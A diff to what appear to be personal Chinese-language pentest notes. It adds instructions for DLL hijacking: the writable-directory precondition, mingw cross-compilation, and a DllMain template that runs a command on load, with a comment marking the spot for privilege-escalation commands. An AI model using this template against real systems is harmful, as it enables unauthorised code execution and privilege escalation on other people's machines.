@@ -180,6 +180,21 @@ appwiz.cpl:安装删除程序
 taskmgr ：任务管理器
 wf.msc :防火墙 
 
+DLL劫持技术，前提是要劫持的DLL目录是可写的.
+在linux 安装编译软件 apt install gcc-mingw-w64-x86-64
+生成dll文件  x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
+
+#include <windows.h>
+
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        system("cmd.exe /k whoami > C:\\Temp\\dll.txt");  //这里是自己想要提权或者运行的命令
+        ExitProcess(0);
+    }
+    return TRUE;
+}
+
+
 ############################install radare2
 wget https://github.com/radare/radare2/archive/4.3.1.tar.gz
 ~ $ tar xzvf 4.3.1.tar.gz
